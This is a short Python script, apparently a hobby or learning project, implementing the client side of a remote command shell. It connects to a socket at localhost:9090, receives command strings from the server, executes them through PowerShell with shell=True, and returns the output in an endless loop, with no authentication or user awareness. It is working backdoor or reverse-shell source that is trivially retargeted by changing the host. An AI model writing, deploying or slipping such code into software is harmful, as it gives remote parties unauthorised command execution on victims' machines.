from socket import AF_INET
from socket import SOCK_STREAM
from socket import socket
from subprocess import run
from subprocess import check_output


class Client:
    def __init__(self):
        self.host = "localhost"
        self.port = 9090
        self.NEWSOCKET = socket(AF_INET, SOCK_STREAM)
        
    def Connect(self):
        self.NEWSOCKET.connect((self.host, self.port))#-We use connect for the client and bind for the server.
        
    def Communicate(self):
        self.UserInput = self.NEWSOCKET.recv(1024).decode("utf-8")
        if self.UserInput in ["1"]:
            self.COMMAND = self.NEWSOCKET.recv(1024).decode("utf-8")
            try:
                self.NEWSOCKET.send(check_output(["powershell", self.COMMAND], shell = True))
            except:
                self.NEWSOCKET.send("[!]Command failed".encode("utf-8"))
def main():
    MyObj = Client()
    MyObj.Connect()
    while(True):
        MyObj.Communicate()
main()

#self.NEWSOCKET.send("Hello i am your client".encode("utf-8")) #-Sends a message to the server.
#self.NEWSOCKET.recv(1024).decode("utf-8") #-Receives and decodes message from server and then printing it to terminal.



